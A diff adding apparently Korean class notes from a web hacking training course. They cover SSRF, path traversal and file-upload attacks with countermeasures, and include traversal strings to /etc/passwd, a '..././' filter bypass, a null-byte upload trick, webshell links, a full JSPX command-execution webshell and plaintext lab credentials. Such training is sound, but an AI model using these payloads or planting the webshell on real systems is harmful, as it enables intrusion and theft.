@@ -1,0 +1,358 @@
+pwd
+
+/var/www/html/ssrf_2/main.php
+
+./main.php  v
+ include/common/declare.php v
+../request_log_ssrf2.php v -> 접속 로그 남기는 기능
+admin.php v
+admin_login.php v -> 관리자 계정
+include/common/property.php v
+include/common/class.db.php v -> DB접속정보와 쿼리 실행하는 기능
+include/common/common.function.php v -> 더미코드 쓰레기코드
+ssrf_2/include/common/JSON.php X
+
+/var/www/html/log/2024-06-19.txt
+/etc/passwd
+
+
+if($id === "adminuser" && $pw === "adminpassword")
+
+관리자 계정
+ID : adminuser
+PW : adminpassword
+
+<?php
+	include_once "include/common/property.php";
+	include_once "include/common/class.db.php";
+	include_once "include/common/common.function.php";
+?>
+
+/* DB Info */
+	/*
+	define( 'db_host' , 'localhost' ); 
+	define( 'db_user' , 'wpartner' );
+	define( 'db_pass' , 'wpartner' ); 
+	define( 'db_db' , 'emergency' );
+	*/
+
+/* RealDB	*/
+	
+	define( "db_host" , "127.0.0.1" ); 
+	define( "db_user" , "skinfosec" );
+	define( "db_pass" , "skinfosec" ); 
+	define( "db_db" , "skinfosec" );
+
+// op db [host: mariadb, ID:ssrf_user, PW:ssrf12#$]
+	self::$instance = new db( "mariadb" , "ssrf_user" , "ssrf12#$" , "skinfosec" );	
+
+* SSRF 
+XSS vs CSRF vs SSRF 
+xss
+클라이언트(웹브라우저, 사용자) -> javascript 의도치않은 악성행위를 시키는 것
+~~~~~~~~~~
+해커 -> 사용자 -> 악성행위
+script로 악성행위를 시키는 것
+
+csrf
+의도치 않은 악성행위인지 아닌지 모르게 서버에서 실행을 해주는 것
+                                       ~~~~~
+해커 -> 사용자 -> 악성행위 -> 해당 서버에서 기능이 작동
+script 안되도 가능
+
+ssrf
+의도치 않은 위치에 서버가 접근하게 만드는 것
+해커 -> 서버 -> 악성행위 -> 내부 자료를 유출하거나 공격을 수행하는
+
+jsp 문제 7 꼭 안해도 됩니다. 
+꼭 정답을 구하는게 아니고 목표가 DB 데이터 탈취!! 입니다.
+
+1. 전체테이블
+2. 테이블 명 -> 전체컬럼
+3. 해당 테이블의 데이터 다뽑기
+
+이런식으로요.
+
+
+* 파일 다운로드 -> Path Traversal
+
+파일 다운로드 기능 -> 경로가 들어갈 때
+
+
+http://test.com/board/filedownload?fileno=3
+
+filedownload경로로 접근했을때
+
+path = path입력값
+filename = filename입력값
+
+basePath = "/var/www/html/file/" ../../../../etc/passwd
+/var/www/html/file/pdf/notice/모집요강.pdf
+
+realPath = basePath + path + filename + ".jpg"
+realPath 다운로드 시켜
+
+
+/var/www/html/file/../../../../../../../../../etc/passwd = /etc/passwd
+/var/www/html/file/../../.../../../../../../../../var/www/html/ssrf_2/include/common/class.db.php
+/var/www/ssrf_2/
+/var/www/html/ssrf_2/include/common/class.db.php
+
+1. 근본적인 대응방안
+  파일 경로 대신에 파일 식별자를 파라미터로 받도록 개발
+  인젝션을 막아야함
+  Mapping
+
+file
+=====================
+fileno      realpath
+========================
+1             /var/www/html/file/모집요강.jpg
+2              /var/www/html/file/board/자료실첨부파일.jpg
+3.   .
+
+2. 사용자입력값 검증 -> Filtering
+
+filepath=/answer1/down.txt
+
+/lib/file/faq/sy.json
+
+basePath = "/var/www/html/storage/file../../../" +/
+
+/var/www/html/storage/file/../../../../../../answer1/down.txt
+
+/answer1/down.txt
+
+/var/www/html/exam26/faqview.php    
+/var/www/html/
+/answer1/down.txt
+http://elms.skinfosec.co.kr:8091/exam26/faqview.php
+http://elms.skinfosec.co.kr:8091/answer1/down.txt
+/answer1/down.txt
+
+
+* 파일 다운로드 문제 2번 -> 3번
+
+상대경로로 공격하세요.
+
+(문제 3번) -> 필터링이 어떻게 되어있을까?도 가능하면 같이 보내주세요.
+1. 공격 URL : copy url 붙여넣기
+2. 정답 :
+
+DM을 보내주시면 됩니다.
+
+../ -> 삭제
+
+..././..././..././..././..././
+
+
+* 파일 업로드 
+-> 파일을 업로드하는 기능이 있을 때
+
+.jpg .png .gif
+
+.elsx .hwp .docx
+
+<- 이 확장자 외의 파일을 업로드를 하는 것
+=================================================
+1. .asp, .php, .jsp -> 업로드          취약점진단
+ 
+===================================
+2. 해당 업로드한 경로를 유추, 확인       모의해킹
+3. 그 경로를 직접 접속
+
+elms1.skinfosec.co.kr:8090/answewr1/test.php
+
+test.php
+
+null
+
+linux
+
+<? php
+   echo 1+1;
+?>
+   <-
+
+0. 근본적인 대응 방안
+
+ 1) 애당초 파일 확장자를 날려버림
+webshell.php ->
+/var/www/html/upload/0o92830944321-sadfiojlfw-aefdkjjsadf
+ 
+ 2) 업로드 하는 폴더를 분리
+ /var/ww/html/upload/
+
+ 
+ /usr/apache/fileupload/
+
+ test.com/upload/__업로드파일___
+
+select * from file where filepath = '_입력값_";
+file 
+=====================================
+ originalFilename    modifyFinename
+====================================
+ webshell.php           0o92830944321-sadfiojlfw-aefdkjjsadf
+
+
+1. 업로드 파일 확장자를 검증 -> 확장자 Filtering
+ 1) Whitelist -> jpg, png, gif 
+ 2) Blacklist <-
+  filename="2024.06.20.test.txt"
+ 
+ pHp PhP PHP
+
+  if filename을 '.' 나눠서 맨 마지막 문자열(을 소문자로 바꾼게) == 'php' || 'asp' || 'jsp':
+    오류처리시켜.
+  else:
+    업로드
+
+  form post
+
+  Content-Type: image/jpeg, image/png, image/gif <- 버프에서 
+  
+   text/plain
+   html/text
+
+image/jpeg
+   <? php 
+
+ jsp, php, asp -> 악성파일일수있으니 업로드가 불가합니다.
+
+
+
+test.php, test.com/board/upload/test.php9
+2
+test.php9
+
+MVC Model , View, Controller
+
+ Frontend Backend DBA
+Route 
+
+    Controller
+test.com
+         /jsp/ ->
+        /board/   -> view
+               write -> 글쓰기
+               read -> 글읽기   ->     DB 게시판 테이블 -> Model
+               /board/upload/ 
+                             test.txt -> /board/upload/test.txt 
+                               ____
+                /board/download?file=
+                     /board/upload/test.txt  http://test.com/board/upload/test.txt
+        /sell/    -> 요
+        /member/  -> 요
+        /as/-> View     -> Model
+naver.com
+        /bloghome.naver -> 
+jsp php asp
+
+Model 1
+
+<? php
+
+?>
+
+/var/www/html/index.html <- 이 사이트의 루트
+/var/www/html/board/write.jsp .php
+/var/www/html/as/asservice.php
+test.com/board/write.php
+tset.com/as/asservice.php
+
+
+index.do
+write.do
+
+
+* 파일 업로드 문제 2, 3, 4번
+
+1. 어떻게 막아놨는지
+2. 그래서 어떻게 우회해서 올렸는지 
+3. 정답
+
+DM 보내주세요.
+
+- 다 한가지 똑같은 방법으로 다 우회가 가능합니다.
+- 하지만 일부러 업로드 안되는걸 확인해서 어떻게 조치를 취약하게 해놨는지 확인해보세요.
+
+2, 3, 4번 한번에 다 보내주세요.
+
+
+3시 20분까지 휴식시간이요~ 20분에 바로 2,3,4번 문제 풀이하고 웹쉘 공격 이어서 진행합니다~
+
+test.php%00.jpg 0x00 null
+
+
+
+
+
+https://elms2.skinfosec.co.kr:8085/exam31/lib/     download.php
+
+  /file/faq/iamfree.png
+
+
+https://elms2.skinfosec.co.kr:8085/exam31/lib/file/faq/sywebshell.php
+https://elms2.skinfosec.co.kr:8085/exam31/file/faq/iamfree.png
+https://elms2.skinfosec.co.kr:8085/file/faq/iamfree.png
+
+1. 일단 해당 서버에서 실행할 수 있는 확장자
+2. 해당 확장자로 필터링을 우회하여 업로드
+3. 올린 파일에 직접 접근할 수 있는 URL을 찾기
+  <? php
+    echo 1+1
+   ?>
+4. 실행되는 지 확인
+5. 악성코드 (웹쉘) 을 업로드 
+
+https://elms2.skinfosec.co.kr:8083/exam31/file/faq/sywebshell.php
+https://elms2.skinfosec.co.kr:8083/file/faq/sywebshell.php
+https://elms2.skinfosec.co.kr:8085/exam31/lib/file/faq/sywebshell.php
+https://elms2.skinfosec.co.kr:8085/exam31/file/faq/sywebshell.php
+https://elms2.skinfosec.co.kr:8085/file/faq/sywebshell.php
+6. 실행 => 공격
+
+
+
+* 문제 5번 PHP -> 6번 JSP -> 7번 JSP
+
+1. 문제 풀이 순서 정리
+  웹쉘 실행 URL 포함
+2. 정답
+
+문제 5번 : /var/www/html/conf/property.php
+문제 6번 : webapps/admin_site/admin_super.jsp
+DM 보내주시면 됩니다.
+#### 답 찾으신분 게더타운 공개채팅방에 파일 위치 공유 ####
+
+PHP : https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985
+JSP : https://github.com/0420syj/cmd.jsp/blob/master/cmd.jsp
+JSPX : ######## 찾으신분 공유 ##################
+
+
+======== JSPX 웹쉘 샘플 코드 ================
+
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://java.sun.com/jsp/jstl/core" version="2.0">
+<jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"/>
+<jsp:directive.page import="java.util.*"/>
+<jsp:directive.page import="java.io.*"/>
+<jsp:scriptlet><![CDATA[
+	String tmp = pageContext.getRequest().getParameter("cmd");
+	if (tmp != null&&!"".equals(tmp)) {
+	try{
+		String str = new String(tmp);
+		Process p = Runtime.getRuntime().exec(str);
+		InputStream in = p.getInputStream();
+		BufferedReader br = new BufferedReader(new InputStreamReader(in,"GBK"));
+		String brs = br.readLine();
+		while(brs!=null){
+			out.println(brs+"</br>");
+			brs = br.readLine();
+		}
+		}catch(Exception ex){
+			out.println(ex.toString());
+		}
+	}]]>
+</jsp:scriptlet>
+</jsp:root>
